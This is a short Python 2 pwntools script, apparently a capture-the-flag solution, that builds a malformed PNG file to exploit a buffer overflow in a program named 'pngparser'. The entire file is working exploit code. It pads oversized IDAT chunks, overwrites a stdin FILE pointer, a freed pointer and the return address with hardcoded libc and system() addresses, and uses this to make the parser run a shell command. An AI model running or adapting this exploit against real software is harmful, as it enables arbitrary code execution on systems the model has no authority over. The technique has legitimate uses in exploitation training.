import binascii
import os

from pwn import *

def crc32(val):
    return binascii.crc32(val) & 0xffffffff


PNG_HEADER = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'

payload = ''

# state 11
payload += PNG_HEADER

'''
IHDR Chunk
'''
# state 12
HEADER = 'IHDR'
data_len = 13
payload += p32(data_len)[::-1] + HEADER

# state 13
data = p32(1)[::-1] + p32(1)[::-1] + p8(8) + p8(0) + p8(0) + p8(0) + p8(0)
payload += data

# state 14
payload += p32(crc32(HEADER+data))[::-1]

'''
IDAT Chunk
'''
# state 12
HEADER = 'IDAT'
data_len = 0x10000 - len(payload) - 12
payload += p32(data_len)[::-1] + HEADER

# state 13
data = cyclic(data_len)
payload += data

# state 14
payload += p32(crc32(HEADER+data))[::-1]

'''
IDAT Chunk
'''
# state 12
HEADER = 'IDAT'
data_len = 0x10000 - 12
payload += p32(data_len)[::-1] + HEADER

# state 13
cycle = cyclic(data_len)
offset1 = cycle.index(p32(0x62616163))
offset2 = cycle.index(p32(0x62616162))
print offset1, offset2
ret_offset = 0x90

LOCAL = True

LIBC_BASE = 0xf7575000

SYSTEM_ADDR = 0x8048540
if LOCAL:
    STDIN_ADDR = LIBC_BASE+(0xf7fa45a0-0xf7df2000)
    LS_ADDR = LIBC_BASE + 0x10ed2
else:
    STDIN_ADDR = 0xf77185a0
    LS_ADDR = STDIN_ADDR + 0x55214

data = 'ls'.rjust(data_len, ' ')
data = data[:offset1]+p32(STDIN_ADDR)+data[offset1+4:]  # feof
data = data[:offset2]+p32(0x00)+data[offset2+4:]  # free
data = data[:ret_offset]+p32(SYSTEM_ADDR)+'aaaa'+p32(LS_ADDR)+data[ret_offset+12:]  # ret

payload += data

# state 14
payload += p32(crc32(HEADER+data))[::-1]

'''
Broken Chunk
'''
# state 12
payload += 'die'


f = open('payload.png', 'wb')
f.write(payload)
f.close()

os.system('ltrace ./pngparser payload.png')
